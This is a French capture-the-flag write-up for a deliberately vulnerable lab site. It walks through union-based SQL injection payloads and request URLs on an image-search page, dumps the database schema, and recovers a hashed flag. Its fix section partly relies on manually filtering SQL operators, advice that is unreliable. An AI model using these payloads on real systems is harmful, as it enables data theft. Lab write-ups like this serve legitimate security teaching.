# Explication

Nom de la faille:   SQL injection searchimg

Aller sur l'URL:  `http://IP_DARKLY/index.php?page=searchimg`

Il y a un input afin de chercher une image.

On a essayé de nombreuses injections SQL avant de trouver. On va résumer avec les injections SQl essentielles

Dans un premier temps, la première  injection qui a fonctionné est:
```
1 OR 1=1
```
http://10.11.200.169/index.php?page=searchimg&id=1+OR+1%3D1&Submit=Submit#


L'injection nous permet d'obtenir toutes la liste de la table `list_images`.



On a ensuite essayé avec un UNION de rajouter une requête afin d'afficher le schéma de la base SQL en entier.

```
	1 OR 1=1 UNION select table_name, table_schema FROM information_schema.columns
    1 OR 1=1 UNION select table_name, column_name FROM information_schema.columns
```

http://10.11.200.169/index.php?page=searchimg&id=1+OR+1%3D1+UNION+select+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#

http://10.11.200.169/index.php?page=searchimg&id=1+OR+1%3D1+UNION+select+table_name%2C+column_name+FROM+information_schema.columns&Submit=Submit#



Grâce à ces deux injections, on a pu lire le schéma complet de la base SQL, c'est à dire récuperer tous les noms des colonnes, des tables et des schémas des tables.

Pour cette falle là, on va se concentrer sur la table list_images qui a pour colonnes:
    `id, url, title, comment`

En faisaint l'injection SQL:
```
	 1 OR 1=1 UNION select id, comment FROM Member_images.list_images
```
http://10.11.200.169/index.php?page=searchimg&id=1+OR+1%3D1+UNION+select+id%2C+comment+FROM+Member_images.list_images&Submit=Submit#


On trouve pour `id=5` le `comment="If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46"`.


On decrypte le hash 1928e8083cf461a51303633093573c46 avec md5, on obtient alors `albatroz`.

Puis on encrypte albatroz comme demandé avec sha256, ce qui nous donne le flag `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`



# Comment profiter de la faille ?

Une injection SQL peut mener à une destruction ou vol de données confidentielles.

Par exemple : vol de mots de passes, adresses email, ...

# Comment la fixe ?

Une des solutions les plus simples pour se prémunir de ce genre d'injections, il est possible d'utiliser différents outils (mySqli, PDO, ...).
Manuellement, cela consiste à vérifier qu'il n'y a aucun opérateur SQL dans la variable injectée.
